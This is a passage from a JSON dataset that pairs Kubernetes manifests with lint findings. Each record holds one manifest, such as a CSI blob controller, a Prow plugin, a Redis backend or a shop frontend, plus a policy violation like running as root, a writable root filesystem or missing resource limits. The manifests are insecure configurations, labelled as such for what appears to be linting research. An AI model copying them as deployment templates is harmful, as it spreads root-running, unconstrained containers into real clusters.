metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "9478",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-resizer\" is not set to runAsNonRoot"
  },
  {
    "id": "9479",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "9480",
    "manifest_path": "data/manifests/the_stack_sample/sample_3613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210305-350f3b2f2e\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"needs-rebase\" does not have a read-only root file system"
  },
  {
    "id": "9481",
    "manifest_path": "data/manifests/the_stack_sample/sample_3613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210305-350f3b2f2e\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"needs-rebase\" is not set to runAsNonRoot"
  },
  {
    "id": "9482",
    "manifest_path": "data/manifests/the_stack_sample/sample_3613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210305-350f3b2f2e\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"needs-rebase\" has cpu request 0"
  },
  {
    "id": "9483",
    "manifest_path": "data/manifests/the_stack_sample/sample_3613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210305-350f3b2f2e\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"needs-rebase\" has memory limit 0"
  },
  {
    "id": "9484",
    "manifest_path": "data/manifests/the_stack_sample/sample_3614.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-matchmaking\n  labels:\n    app: redis-matchmaking\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-matchmaking\n  template:\n    metadata:\n      labels:\n        app: redis-matchmaking\n        tier: backend\n    spec:\n      containers:\n      - name: redis-matchmaking\n        image: docker.io/redis:6.0.5\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis-matchmaking\" does not have a read-only root file system"
  },
  {
    "id": "9485",
    "manifest_path": "data/manifests/the_stack_sample/sample_3614.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-matchmaking\n  labels:\n    app: redis-matchmaking\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-matchmaking\n  template:\n    metadata:\n      labels:\n        app: redis-matchmaking\n        tier: backend\n    spec:\n      containers:\n      - name: redis-matchmaking\n        image: docker.io/redis:6.0.5\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis-matchmaking\" is not set to runAsNonRoot"
  },
  {
    "id": "9486",
    "manifest_path": "data/manifests/the_stack_sample/sample_3614.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-matchmaking\n  labels:\n    app: redis-matchmaking\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-matchmaking\n  template:\n    metadata:\n      labels:\n        app: redis-matchmaking\n        tier: backend\n    spec:\n      containers:\n      - name: redis-matchmaking\n        image: docker.io/redis:6.0.5\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis-matchmaking\" has memory limit 0"
  },
  {
    "id": "9487",
    "manifest_path": "data/manifests/the_stack_sample/sample_3615.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: monitoring-influxdb\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      task: monitoring\n      k8s-app: influxdb\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        task: monitoring\n        k8s-app: influxdb\n    spec:\n      containers:\n      - name: influxdb\n        image: gcr.io/google_containers/heapster-influxdb-amd64:v1.1.1\n        volumeMounts:\n        - mountPath: /data\n          name: influxdb-storage\n      volumes:\n      - name: influxdb-storage\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"influxdb\" does not have a read-only root file system"
  },
  {
    "id": "9488",
    "manifest_path": "data/manifests/the_stack_sample/sample_3615.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: monitoring-influxdb\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      task: monitoring\n      k8s-app: influxdb\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        task: monitoring\n        k8s-app: influxdb\n    spec:\n      containers:\n      - name: influxdb\n        image: gcr.io/google_containers/heapster-influxdb-amd64:v1.1.1\n        volumeMounts:\n        - mountPath: /data\n          name: influxdb-storage\n      volumes:\n      - name: influxdb-storage\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"influxdb\" is not set to runAsNonRoot"
  },
  {
    "id": "9489",
    "manifest_path": "data/manifests/the_stack_sample/sample_3615.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: monitoring-influxdb\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      task: monitoring\n      k8s-app: influxdb\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        task: monitoring\n        k8s-app: influxdb\n    spec:\n      containers:\n      - name: influxdb\n        image: gcr.io/google_containers/heapster-influxdb-amd64:v1.1.1\n        volumeMounts:\n        - mountPath: /data\n          name: influxdb-storage\n      volumes:\n      - name: influxdb-storage\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"influxdb\" has cpu request 0"
  },
  {
    "id": "9490",
    "manifest_path": "data/manifests/the_stack_sample/sample_3615.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: monitoring-influxdb\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      task: monitoring\n      k8s-app: influxdb\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        task: monitoring\n        k8s-app: influxdb\n    spec:\n      containers:\n      - name: influxdb\n        image: gcr.io/google_containers/heapster-influxdb-amd64:v1.1.1\n        volumeMounts:\n        - mountPath: /data\n          name: influxdb-storage\n      volumes:\n      - name: influxdb-storage\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"influxdb\" has memory limit 0"
  },
  {
    "id": "9491",
    "manifest_path": "data/manifests/the_stack_sample/sample_3617.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeder-qualifiers-kprca00033\n  labels:\n    type: cyborg-seeder\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeder-qualifiers-kprca00033\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeder.py qualifiers KPRCA_00033\n      3600 6\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cyborg-seeder-qualifiers-kprca00033\" does not have a read-only root file system"
  },
  {
    "id": "9492",
    "manifest_path": "data/manifests/the_stack_sample/sample_3617.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeder-qualifiers-kprca00033\n  labels:\n    type: cyborg-seeder\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeder-qualifiers-kprca00033\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeder.py qualifiers KPRCA_00033\n      3600 6\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cyborg-seeder-qualifiers-kprca00033\" is not set to runAsNonRoot"
  },
  {
    "id": "9493",
    "manifest_path": "data/manifests/the_stack_sample/sample_3618.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: tjma/frontend:v0.0.2\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9494",
    "manifest_path": "data/manifests/the_stack_sample/sample_3618.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: tjma/frontend:v0.0.2\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "9495",
    "manifest_path": "data/manifests/the_stack_sample/sample_3618.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: tjma/frontend:v0.0.2\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"server\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "9496",
    "manifest_path": "data/manifests/the_stack_sample/sample_3618.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: tjma/frontend:v0.0.2\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "9497",
    "manifest_path": "data/manifests/the_stack_sample/sample_3618.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: tjma/frontend:v0.0.2\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "9498",
    "manifest_path": "data/manifests/the_stack_sample/sample_3618.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: tjma/frontend:v0.0.2\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "9499",
    "manifest_path": "data/manifests/the_stack_sample/sample_3619.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.120\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gcactivities\" does not have a read-only root file system"
  },
  {
    "id": "9500",
    "manifest_path": "data/manifests/the_stack_sample/sample_3619.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.120\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-gcactivities\" not found"
  },
  {
    "id": "9501",
    "manifest_path": "data/manifests/the_stack_sample/sample_3619.yaml",
